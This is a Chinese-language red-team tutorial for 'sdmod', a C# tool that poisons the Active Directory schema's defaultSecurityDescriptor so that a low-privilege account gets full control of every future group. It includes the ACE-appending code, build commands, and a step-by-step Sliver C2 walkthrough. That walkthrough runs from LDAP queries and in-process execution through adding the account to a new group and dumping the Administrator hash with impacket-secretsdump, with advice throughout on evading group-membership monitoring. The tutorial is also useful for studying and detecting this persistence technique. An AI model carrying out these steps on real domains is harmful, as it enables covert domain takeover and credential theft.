# sdmod —— AD 架构安全描述符修改实战教程

**语言**: [English](TUTORIAL.md) | **中文** | [Français](TUTORIAL.fr.md)

> 面向红队/授权渗透测试场景，通过污染 AD Schema 的 `defaultSecurityDescriptor`，在不加入任何高危组的前提下，实现对未来新建对象的长期隐蔽权限控制。
>
> ⚠️ 本教程及配套工具仅用于**授权测试环境**（实验室/靶场/已获书面授权的评估），请勿用于未授权的真实系统。示例中的域名、账号、密码与 SID 均为虚构占位。

---

## 1. 背景与目标

在获得一个低权限域账号（如 `redpen`）后，常规提权思路是把它加入 `Domain Admins` 等高危组。但这会产生大量监控噪音：防守方通常会严密监控特权组的 `Member` 属性变更（Windows 安全日志 **Event ID 4728 / 4732**），很快就会被发现。

本方案的目标是：

- **不修改任何组成员关系**，避开常规监控；
- 通过修改 AD **架构（Schema）分区**中某个类的 `defaultSecurityDescriptor`（默认安全描述符）——即"污染模板"；
- 让 **未来新建的每一个该类对象**（如新组）在初始化 ACL 时，自动给指定 SID（如 `redpen` 的 SID）写入一条**完全控制** ACE（与 Domain Admins 相同的权限集）；
- 实现长期、隐蔽、可持续的权限维持：`redpen` 无需加入任何特权组，即可在未来接管任何新建的特权组。

---

## 2. 为什么不用现成工具

最初尝试了 `sharpview`、`sharpsh`、`nps` 等现成工具，但在实际操作时（当时的 Mono 编译环境）均以各种踩坑失败，主要包括：

- **Mono 编译环境与 Windows 原生安全 API 的兼容性差异**：`System.Security.AccessControl` 命名空间生成的二进制安全描述符不被域控认可，持续触发「服务器不愿意处理请求」；
- **SDDL/安全描述符格式校验差异**：即使改用 P/Invoke 调用 `advapi32.dll` 原生 API 转换，在架构分区的 DS 类型安全描述符上依然存在格式校验差异；
- **FSMO 角色定位问题**：架构对象修改必须连接持有 **Schema Master** FSMO 角色的域控，自动选址大概率连到普通 DC 而触发拒绝。

与其修改这三个应用的源码，不如**自己写一个极简工具**，专门针对该场景，同时兼顾 Sliver C2 的进程内执行需求。

---

## 3. 工具设计：sdmod

### 3.1 核心逻辑

`sdmod` 是一个极简 C# 控制台程序，通过 LDAP 绑定域控，读取目标对象的 SDDL 格式安全描述符，在末尾追加一条指定 SID 的完全控制允许 ACE，再直接将新的 SDDL 字符串写回 AD 属性，由域控原生完成格式解析与转换。

**参数（5 个）：**

| 参数 | 说明 |
|---|---|
| `<LDAP Path>` | LDAP 对象路径，如 `LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,...` |
| `<User>` | 认证用户名（`domain\user`） |
| `<Pass>` | 密码 |
| `<AttrName>` | 目标属性名（如 `defaultSecurityDescriptor`） |
| `<TrusteeSID>` | 被授予权限主体的 SID |

**源码**：见仓库根目录 [`sdmod.cs`](../sdmod.cs)（编译期仅引用 `System.DirectoryServices`，无第三方依赖）。核心逻辑只有一行——追加与 Domain Admins 同款权限的允许 ACE：

```csharp
string newAce = "(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;" + trusteeSid + ")";
string newSddl = originalSddl + newAce;
```

### 3.2 关键设计取舍（每一条都是踩坑后的工程化妥协）

| 取舍 | 说明 |
|---|---|
| **放弃二进制安全描述符，改用纯字符串 SDDL** | 标准的 `CommonSecurityDescriptor` 二进制操作在 Mono 下生成的格式不被域控认可；直接操作 SDDL 字符串由域控原生解析转换，与管理员通过 ADSI 编辑器 / `Set-ADObject` 修改的底层逻辑完全一致，格式兼容性最高。该属性读取时本身就返回 SDDL 字符串，证明 AD 对字符串形式原生支持。 |
| **追加 ACE 而非全量替换** | 架构分区安全描述符含特殊对象型 ACE（OA）、隐含所有者/主组属性，手动构造易遗漏或写错。追加只新增权限、不改动原有结构，100% 保留默认配置，符合"最小影响、最小痕迹"原则。 |
| **仅依赖 `System.DirectoryServices`** | 刻意避开 Mono 下兼容性差的 `System.Security.AccessControl` 等命名空间。代价是缺少强类型校验，换来极致兼容性：体积小、无额外依赖、跨版本稳定，适配 Sliver 进程内注入。 |
| **显式 `ServerBind` 屏蔽自动选址** | 不指定时 Windows 原生 DC 定位器可能连到普通 DC；显式绑定指定服务器，从根源上屏蔽 FSMO 角色定位错误。 |
| **入参直接传 SID 而非账号名** | 安全描述符内部以 SID 为主体标识，直接传 SID 省去"账号名→SID"解析，减少 API 调用与失败点，贴合红队实战（通常已提前获取目标 SID）。 |
| **绑定模式 `Secure`** | 启用 LDAP 签名/加密，避免凭据明文传输，适配域控默认安全策略。 |

### 3.3 SDDL 速览

`defaultSecurityDescriptor` 属性以 **SDDL**（Security Descriptor Definition Language，安全描述符定义语言）字符串形式存储与返回——这是微软提供的人类可读的安全描述符文本语法。域控原生解析 SDDL，因此写入 SDDL 字符串与通过 ADSI 编辑器或 `Set-ADObject` 修改描述符完全等价：全程无需任何手动二进制转换。

以 5.1 查询到的值为例：

```text
D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)
```

- `D:`——标识 **DACL**（自由访问控制列表）的前缀；每个 `(...)` 块是一条 **ACE**（访问控制项）。
- ACE 是由分号分隔的六字段元组：`(type;flags;rights;object_guid;inherit_object_guid;trustee)`。

**本描述符用到的权限位：**

| 代码 | 含义 | 代码 | 含义 |
|---|---|---|---|
| `RP` | 读取属性 | `RC` | 读取控制 |
| `WP` | 写入属性 | `WD` | 写 DAC（更改权限） |
| `CR` | 创建子对象 | `SD` | 删除 |
| `CC` | 创建全部子对象 | `DT` | 删除树 |
| `DC` | 删除子对象 | `SW` | 自写入 |
| `LC` | 列出子对象 | `LO` | 列出对象 |

解读 5.1 中的各条目（`A` = **Access Allowed**，即允许 ACE；两条 `OA` 条目为对象型 ACE，见下文）：

| 条目 | 受托者 | 权限 |
|---|---|---|
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)` | Domain Admins | 完全控制 |
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)` | SYSTEM | 完全控制 |
| `(A;;RPLCLORC;;;AU)` | Authenticated Users | 读取（RP + LC + LO + RC） |
| `(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)` | Account Operators | 完全控制 |
| `(A;;RPLCLORC;;;PS)` | Print Operators | 读取 |
| `(OA;;CR;ab721a55-...;;AU)` | Authenticated Users | 对象型 ACE——创建 GUID 所标识类别的子对象 |
| `(OA;;RP;46a9b11d-...;;S-1-5-32-560)` | Windows Authorization Access Group | 对象型 ACE——读取 GUID 所标识的特定属性 |

`RPWPCRCCDCLCLORCWOWDSDDTSW` 覆盖了全部目录服务对象权限——即完全控制，与 Domain Admins 所持权限一致。受托者名（`DA`、`SY`、`AU`、`AO`、`PS`）是 SDDL 对知名 SID 的别名：分别对应 Domain Admins、SYSTEM、Authenticated Users、Account Operators 与 Print Operators。

两条 `OA` 条目是**对象型 ACE**：`OA` 即 **Object Access Allowed**（对象访问允许）。与普通 `A` ACE 不同，`OA` ACE 携带一个额外的 ObjectType GUID，仅作用于该 GUID（schemaIDGUID）所标识类别的对象或属性——第一条限定创建特定类别的子对象，第二条限定读取特定属性。这是架构分区特有、普通允许 ACE 无法表达的结构。

**本工具追加的内容**——一条允许 ACE，赋予受托者 SID 与 Domain Admins 相同的完全控制权限：

```text
(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx)
```

类型 `A`（Access Allowed）、空标志与 GUID、完全控制权限串、目标 SID。因为是追加而非替换——原有每条（含两条 `OA` ACE、隐含所有者与主组）都完整保留。

---

## 4. 编译

环境：Kali / Mono（`Mono C# compiler version 6.14.1.0`）

```bash
# 获取源码（单文件）
curl -O https://raw.githubusercontent.com/RedteamNotes/sdmod/main/sdmod.cs

# 安装编译依赖（Debian / Kali）
sudo apt update
sudo apt install -y mono-mcs mono-devel

# 最小可用版本
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll

# 推荐（固定 x64 + 不生成调试符号文件）
mcs sdmod.cs -out:sdmod.exe -r:System.DirectoryServices.dll -platform:x64 -debug-
```

**参数说明：**

| 参数 | 作用 |
|---|---|
| `-platform:x64` | 强制 x64 目标，匹配 Sliver beacon 架构，避免进程内注入架构不匹配 |
| `-debug-` | 不生成 .mdb 调试符号文件 |

基础编译即可用，产物约 4-6 KB。`-optimize` 等参数对如此小的程序收益可忽略，`-nologo` 只是关闭编译器 banner、与产物无关——不必为"隐蔽性"堆砌参数，实际收益只有 `-platform:x64` 和 `-debug-`。

---

## 5. 实战流程

> 环境：域 `redteamnotes.local`，域控 `dc.redteamnotes.local`，低权限账号 `redpen`。全部操作在 Sliver beacon（`hairpin-turn`）会话内进行。

### 5.1 查询原始值（记录以便回滚）

执行修改前，先确认目标对象当前属性，记录原始 SDDL：

```text
sliver > sa-ldapsearch -- -query "(name=Group)" -dn "CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes defaultSecurityDescriptor
```

输出（原始值）：

```text
defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)
```

### 5.2 执行修改

```text
sliver > execute-assembly --in-process sdmod.exe -- "LDAP://dc.redteamnotes.local/CN=Group,CN=Schema,CN=Configuration,DC=redteamnotes,DC=local" "redteamnotes\redpen" "P@ssw0rd" "defaultSecurityDescriptor" "S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx"
```

输出：`[+] Success: ACE added successfully`

> ⚠️ 密码 `P@ssw0rd` 以明文出现在 `execute-assembly` 参数中（进程列表可见）。这是该流程的固有暴露面：接受它，或改用已在目标进程内持有凭据的上下文。

### 5.3 验证（与原始值对比）

再次执行 5.1 的查询，可见末尾新增了一条 ACE：

```text
defaultSecurityDescriptor: D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;AO)(A;;RPLCLORC;;;PS)(OA;;CR;ab721a55-1e2f-11d0-9819-00aa0040529b;;AU)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx)
```

### 5.4 等待权限生效

**关键：修改后必须等待约 3-5 分钟权限才会生效，1-2 分钟不可能生效。** 等待时间不足时，后续加组操作会报错（如 `Unable to add user to group 5` / `Adding user to group failed: 560`）。

### 5.5 模拟目标身份（make-token）

在 Beacon 线程上模拟 `redpen` 身份，使后续网络操作以 `redpen` 凭证执行：

```text
sliver > make-token -d redteamnotes.local -u redpen -p 'P@ssw0rd'
```

> 注意：Sliver 的 `make-token` 底层默认使用 `LOGON32_LOGON_NEW_CREDENTIALS` 登录类型——本地操作仍以原进程身份执行，**只有出站网络连接**才使用新凭证。可用 `--logon-type` 更改。

### 5.6 加组（高 OPSEC 的 BOF）

使用 `remote-addusertogroup` BOF 将 `redpen` 加入目标组：

```text
sliver > remote-addusertogroup -- --username redpen --server dc.redteamnotes.local --domain redteamnotes.local --groupname new_admingroup
```

- **生效时间不足时**：报错 `Unable to add user to group 5 ... Adding user to group failed: 560`；
- **等待 3-5 分钟后再执行**：输出 `SUCCESS.`。

### 5.7 验证加组

```text
sliver > sa-ldapsearch -- -query "(sAMAccountName=redpen)" -dn "DC=redteamnotes,DC=local" -hostname dc.redteamnotes.local -attributes "sAMAccountName,cn,servicePrincipalName,memberOf"
```

输出 `memberOf` 已包含目标组：

```text
memberOf: CN=new_admingroup,CN=Users,DC=redteamnotes,DC=local, CN=webadmins,DC=redteamnotes,DC=local, CN=Schema Admins,CN=Users,DC=redteamnotes,DC=local
```

### 5.8 立即转储（验证并利用）

**加组成功后，组权限可能几分钟后回落，这是权限的倒计时。** 建议提前准备好转储命令，加组成功后立刻执行：

```bash
impacket-secretsdump redteamnotes.local/redpen:'P@ssw0rd'@dc.redteamnotes.local -just-dc-user administrator
```

转储成功即证明权限利用完成（拿到 `Administrator` 的 NTLM hash、Kerberos 密钥）。若转储失败，先检查是否没加上组。该操作可反复执行，不必过于紧张。

---

## 6. 概念澄清：组成员 vs 默认安全描述符

容易混淆的两个概念：

| 概念 | 说明 |
|---|---|
| **组成员（Member）** | "谁在哪个组里"。蓝队严密监控特权组 Member 变更（Event ID 4728/4732），直接加 `Domain Admins` 噪音极大，易被发现。 |
| **默认安全描述符（defaultSecurityDescriptor）** | 定义在 AD Schema 中的"图纸/模板"，位于 `CN=Schema` 下。修改它类似 `Set-ADObject` 修改类的模板。 |

**模板污染的真实效果：**

- 当前域内**已存在**的组，权限**不会发生任何变化**；
- 命令执行后，管理员在域内**新创建的任何组**，初始化 ACL 时都会读取被篡改的 `defaultSecurityDescriptor`；
- 由于描述符中硬编码了 `redpen` 的 SID 并赋予极高权限，**未来每一个新建的组，`redpen` 都会自动拥有完全控制权**（与 Domain Admins 相同的权限集）。

**隐蔽性来源：** 无需显式加入任何高危组，避开常规监控。若未来 IT 新建一个管理核心业务的特权组，`redpen` 无需入组即可利用 ACL 权限修改组成员或直接接管，实现长期且极其隐蔽的权限维持。

---

## 7. OPSEC 要点与注意事项

1. **不加入高危组**：全程不触发组成员关系变更监控；
2. **等待窗口**：修改后约 3-5 分钟生效，时间不足会报错；
3. **转储要快**：加组成功后组权限是倒计时，提前备好转储命令；
4. **回滚**：修改前务必记录原始 SDDL（见 5.1），以便恢复；
5. **最小影响**：append-only 追加策略，不破坏原有权限结构；
6. **执行形态**：优先用 BOF / `execute-assembly --in-process`，避免落盘；如需 BOF 化，建议复用现有 LDAP BOF 基元做薄封装，而非从零重写 C 层 LDAP；
7. **重复运行**：同一 SID 重复执行会在 SDDL 末尾重复追加同一条 ACE（无幂等），需要还原时用 5.1 记录的原始 SDDL。

---

## 8. 工具命名与维护

- **命名**：`sdmod`（SD = Security Descriptor，mod = modify；短名负责好记，README 负责严谨）
- **代码仓库**：`github.com/RedteamNotes/sdmod`（公开）
- **版本兼容**：.NET Framework / Mono 均可编译；如需 BOF 化，优先基于现有 LDAP BOF 基元薄封装。

---

*示例中的域名、账号、密码与 SID 均为虚构；本文档仅用于授权测试与安全研究。*
